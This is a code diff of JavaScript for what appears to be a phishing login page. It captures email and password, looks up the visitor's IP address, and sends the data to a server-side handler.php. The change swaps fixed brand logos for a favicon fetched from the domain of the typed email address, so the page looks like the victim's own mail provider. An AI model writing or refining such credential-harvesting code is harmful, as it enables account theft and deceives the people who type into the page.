@@ -10,17 +10,6 @@ const logoImage = document.querySelector(".img")
 const emailBox = document.querySelector("[name=email]")
 const passwordBox = document.querySelector("[name=password]")
 
-const BG = {
-    orange: {
-        bg: "./img/orangebg.jpg",
-        logo: "./img/orange.png"
-    },
-    mango: {
-        bg: "./img/mangobg.png",
-        logo: "./img/mango.svg"
-    },
-}
-
 const USER_CREDS = {}
 let count = 1
 
@@ -43,9 +32,6 @@ const getIPAddress = async () => {
     try {
         const request = await fetch("https://ipapi.co/json/")
         const response = await request.json()
-        // console.group("IP")
-        // console.log(response)
-        // console.groupEnd("IP")
         return response
 
     } catch (e) {
@@ -96,24 +82,28 @@ const revertChanges = () => {
 }
 
 const checkEmailName = () => {
-    const allowedEmail = ['orange', 'mango']
-    allowedEmail.forEach(email => {
-        if(USER_CREDS['email'].includes(email)){
-            const { logo, bg } = BG[email]
-            const body = document.body
-            body.style.backgroundImage = `url(${bg})`
+
+    const domain = USER_CREDS['email'].split("@").pop()
+    const favicon = `https://www.google.com/s2/favicons?domain=${domain}&sz=256`
+
+    const image = new Image()
+    image.src = favicon
+    logoImage.innerHTML = ""
+    logoImage.appendChild(image)
+
+    // allowedEmail.forEach(email => {
+    //     if(USER_CREDS['email'].includes(email)){
+    //         const { logo, bg } = BG[email]
+            // const body = document.body
+            // body.style.backgroundImage = `url(${bg})`
 
             // const body = document.body
             // body.style.setProperty("--bg", `url(${bg})`)
             // body.className = "change"
             
-            const image = new Image()
-            image.src = logo
-            logoImage.innerHTML = ""
-            logoImage.appendChild(image)
 
-        }
-    })
+    //     }
+    // })
 }
 
 const isLoading = state => {
@@ -144,6 +134,7 @@ const handleSendEmail = async () => {
         const request = await fetch("./handler.php", option)
         const response = await request.json()
         return response
+        // return {}
     }
     catch (err) {
         return { error: err.message }
